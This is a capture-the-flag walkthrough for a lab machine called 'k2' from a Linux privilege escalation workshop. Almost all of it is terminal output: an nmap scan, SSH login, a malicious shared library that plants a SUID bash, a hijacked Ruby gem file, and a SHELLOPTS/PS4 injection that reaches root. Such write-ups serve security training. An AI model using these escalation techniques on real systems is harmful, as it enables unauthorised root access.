/dev/random : k2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] ssh with user and password
[+] Privilege escalation with misconfigured SUID

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.105
Host is up (0.037s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:c3:40:d6:f4:23:6f:16:b1:19:c5:86:a2:46:43:54 (RSA)
|   256 91:8c:0f:3e:0d:d1:18:86:09:8e:b5:05:50:16:e7:4d (ECDSA)
|_  256 fc:16:2c:d7:9f:da:e5:b8:9d:17:f4:ea:42:f9:2a:22 (ED25519)
MAC Address: 08:00:27:9D:71:8C (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
Network Distance: 1 hop

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Logging into the server as user : password


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh user@192.168.56.105
user@192.168.56.105's password: 
Last failed login: Tue Nov  5 07:40:06 EST 2019 from 192.168.56.101 on ssh:notty
There were 3 failed login attempts since the last successful login.
[user@localhost ~]$ id
uid=1000(user) gid=1000(user) groups=1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Getting user 2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[user@localhost ~]$ ls
[user@localhost ~]$ sudo -l
[sudo] password for user: 
Matching Defaults entries for user on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User user may run the following commands on this host:
    (user2) /bin/calc
[user@localhost ~]$ /bin/calc
Calculating something, please wait...
[=====================================================================>] 99 %
Done.

[user@localhost ~]$ mkdir .config
[user@localhost ~]$ cd .config
[user@localhost .config]$ nano libcalc.so
user2@localhost .config]$ cat libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void x() __attribute__((constructor));

void x() {
	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}




[user@localhost .config]$ nano libcalc.c 
[user@localhost .config]$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
[user@localhost .config]$ sudo -u user2 /bin/calc
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
[user@localhost .config]$ chmod +x /home/user
[user@localhost .config]$ sudo -u user2 /bin/calc
Calculating something, please wait...

[user2@localhost .config]$ id
uid=1001(user2) gid=1001(user2) groups=1001(user2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[user2@localhost .config]$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


User3

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[user2@localhost tmp]$ cat /sbin/bckup
#!/usr/bin/env ruby

require 'rubygems'
require 'zip'

directory = '/etc/firewalld/'
zipfile_name = '/tmp/firewalld-backup.zip'

File.delete(zipfile_name) if File::exists?(zipfile_name)
Zip::File.open(zipfile_name, Zip::File::CREATE) do |zipfile|
	Dir[File.join(directory, '**', '**')].each do |file|
	  zipfile.add(file.sub(directory, ''), file)
	end
end
[user2@localhost tmp]$ which zip
/usr/bin/which: no zip in (/sbin:/bin:/usr/sbin:/usr/bin)

[user2@localhost tmp]$ gem which zip
/usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb

[user2@localhost tmp]$ echo '`cp /bin/bash /tmp/bash2 && chmod +s /tmp/bash2`' > /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb

[user2@localhost tmp]$ ls -al
total 1880
drwxrwxrwt.  7 root  root     118 Nov  5 08:07 .
dr-xr-xr-x. 17 root  root     224 Aug 30  2017 ..
-rwsr-sr-x.  1 user2 user2 960472 Nov  5 07:56 bash
-rwsr-sr-x.  1 user3 user3 960472 Nov  5 08:07 bash2
drwxrwxrwt.  2 root  root       6 Aug 30  2017 .font-unix
drwxrwxrwt.  2 root  root       6 Aug 30  2017 .ICE-unix
drwxrwxrwt.  2 root  root       6 Aug 30  2017 .Test-unix
drwxrwxrwt.  2 root  root       6 Aug 30  2017 .X11-unix
drwxrwxrwt.  2 root  root       6 Aug 30  2017 .XIM-unix

[user2@localhost tmp]$ ./bash2 -p
bash2-4.2$ id
uid=1001(user2) gid=1001(user2) euid=996(user3) egid=994(user3) groups=994(user3),1001(user2) context=unconfined_u:unconfined_r:unconfined_t:s
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash2-4.2$ find / -perm -u=s -type f 2>/dev/null
/tmp/bash
/tmp/bash2
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper
/usr/local/bin/whoisme

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash4 && chown root.root /tmp/bash4 && chmod +s /tmp/bash4)' /bin/sh -c '/usr/local/bin/whoisme'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.2$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash4 && chown root.root /tmp/bash4 && chmod +s /tmp/bash4)' /bin/sh -c '/usr/local/bin/whoisme'
chown: changing ownership of '/tmp/bash4': Operation not permitted
/usr/local/bin/whoisme
/usr/bin/logname
user
bash-4.2$ id
uid=996(user3) gid=994(user3) groups=994(user3),1001(user2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.2$ ls /tmp
bash  bash2  bash3  bash3.c  bash4
bash-4.2$ ./bash4 -p
bash4-4.2# id
uid=996(user3) gid=994(user3) euid=0(root) egid=0(root) groups=0(root),1001(user2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash4-4.2# ./bash3
[root@localhost tmp]# id
uid=0(root) gid=0(root) groups=0(root),1001(user2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[root@localhost tmp]# cd /root
[root@localhost root]# ls
anaconda-ks.cfg  flag.txt
[root@localhost root]# cat flag.txt 

___________.__                      __            __
\_   _____/|  | _____     ____    _/  |____  ____/  |_
 |    __)  |  | \__  \   / ___\   \   __\  \/  /\   __\
 |     \   |  |__/ __ \_/ /_/  >   |  |  >    <  |  |
 \___  /   |____(____  /\___  / /\ |__| /__/\_ \ |__|
     \/              \//_____/  \/            \/

Congrats!! :D
FLAG: da96dd381dc607ccd3302312233531efa68b8b7b

-----------------------------------------------------
This challenge was created as part of:
Windows	/ Linux Local Privilege	Escalation Workshop (@s4gi_)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~






